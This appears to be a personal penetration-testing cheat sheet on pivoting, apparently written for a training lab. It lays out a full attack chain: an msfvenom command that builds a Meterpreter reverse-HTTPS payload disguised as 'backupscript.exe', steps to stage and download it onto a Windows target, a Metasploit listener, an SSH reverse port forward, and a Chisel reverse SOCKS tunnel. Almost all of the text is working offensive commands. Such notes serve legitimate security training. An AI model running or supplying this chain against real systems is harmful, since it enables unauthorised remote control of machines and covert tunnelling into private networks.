
[Meterpreter](5%20Lateral%20Movement/Pivoting/Tools/Meterpreter.md)

When you want to forward a local service to the remote host 
Might be useful in the case of reverse shells 

# Meterpreter 
Create meterpreter shells on windows
1. create payload using msfvenom 
2. configuration
	1. lhost = IP address of pivot host 
	2. LPORT = 8080 (on lhost)

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

transfer payload to pivot host
```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

listener (on our attack host)
```
msf6> use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

starting a webserver on pivot host
```
python3 -m http.server 8123
```

download payload on target host
```powershell-session
Invoke-WebRequest -Uri "http://<pivot host internal address>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

port forward the pivot target 8080 to our listening connecting on 8000 on our attack host
```shell-session
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 username@<ipAddressofTarget> -vN

ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.224.171 -vN
```
you need to give it a while for it to work

# Chisel 
on attack host
```
sudo ./chisel server --reverse -v -p 1234 --socks5
```
on pivot 
```
./chisel client -v 10.10.14.17:1234 R:socks
```
check proxychain conf to make sure it is socks5 and port1080